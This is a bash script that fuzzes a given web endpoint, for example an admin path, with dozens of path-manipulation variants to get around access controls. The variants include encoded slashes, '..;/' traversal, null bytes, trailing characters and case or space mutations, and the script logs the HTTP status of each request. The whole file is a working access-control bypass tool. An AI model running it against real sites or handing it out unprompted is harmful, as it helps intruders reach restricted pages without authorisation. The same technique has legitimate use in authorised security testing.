#!/usr/bin/env bash

# Check if URL argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <base-url>"
    echo "Example: $0 https://example.com/admin"
    exit 1
fi

# Clean input URL: remove trailing slash if present
BASE_URL=$(echo "$1" | sed 's/\/$//')

# Extract protocol+domain and the endpoint name
# e.g., https://example.com/admin -> DOMAIN="https://example.com", ENDPOINT="admin"
DOMAIN=$(echo "$BASE_URL" | grep -oE '^https?://[^/]+')
ENDPOINT=$(echo "$BASE_URL" | grep -oE '[^/]+$')

# Define suffixes to append directly to the BASE_URL
suffixes=(
    "/?" "//" "///" "/./" "?" "??" "??" "/?/" "/??" "/??/" 
    "/.." "/../" "/./" "/." "/.//" "/*" "//*" 
    "/%2f" "/%2f/" "/%20" "/%20/" "/%09" "/%09/" "/%0a" "/%0a/" 
    "/%0d" "/%0d/" "/%25" "/%25/" "/%23" "/%23/" "/%26" "/%3f" 
    "/%3f/" "/%26/" "#" "#/" "#/./" "..;/" ".json" "/.json" 
    "..;/" ";/" "%00" ".css" ".html" "?id=1" "~" "/~" "/°/" 
    "/&" "/-" "\/\/" "/..%3B/" "/;%2f..%2f..%2f" "/..\;/" "/$"
)

# Define full custom path patterns relative to the DOMAIN
# %s will be replaced by the ENDPOINT name
patterns=(
    "/./%s" "/./%s/" "/..;/%s" "/..;/%s/" "/.;/%s" "/.;/%s/" 
    "/%s" "/%s/" "//;//%s" "//;//%s/" "/%%2e/%s" "/%%2e/%s/" 
    "/%%20/%s/%%20" "/%%20/%s/%%20/" "/*/%s" "/*/%s/"
)

echo "=== Running Bypass Fuzzing on: $BASE_URL ==="
echo "------------------------------------------------"

# 1. Run Suffix Patterns
for suffix in "${suffixes[@]}"; do
    target_url="${BASE_URL}${suffix}"
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target_url")
    echo "[$status_code] -> $target_url"
done

# 2. Run Mid-Path / Prefix Patterns
for pattern in "${patterns[@]}"; do
    # Format the pattern with the actual endpoint name
    path=$(printf "$pattern" "$ENDPOINT")
    target_url="${DOMAIN}${path}"
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target_url")
    echo "[$status_code] -> $target_url"
done

# 3. Run Case Mutation and Specific Outliers
# Case Mutation
UPPER_ENDPOINT=$(echo "$ENDPOINT" | tr '[:lower:]' '[:upper:]')
target_url_upper1="${DOMAIN}/${UPPER_ENDPOINT}"
status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target_url_upper1")
echo "[$status_code] -> $target_url_upper1"

target_url_upper2="${DOMAIN}/${UPPER_ENDPOINT}/"
status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target_url_upper2")
echo "[$status_code] -> $target_url_upper2"

# Space injection inside endpoint name (e.g., ADM+IN)
if [ ${#ENDPOINT} -gt 3 ]; then
    mid_point=$((${#ENDPOINT} / 2))
    part1="${ENDPOINT:0:$mid_point}"
    part2="${ENDPOINT:$mid_point}"
    
    # Convert to upper case to match your specific ADM+IN pattern
    part1_up=$(echo "$part1" | tr '[:lower:]' '[:upper:]')
    part2_up=$(echo "$part2" | tr '[:lower:]' '[:upper:]')
    
    target_url_space="${DOMAIN}/${part1_up}+${part2_up}"
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target_url_space")
    echo "[$status_code] -> $target_url_space"
    
    target_url_space_slash="${DOMAIN}/${part1_up}+${part2_up}/"
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target_url_space_slash")
    echo "[$status_code] -> $target_url_space_slash"
fi
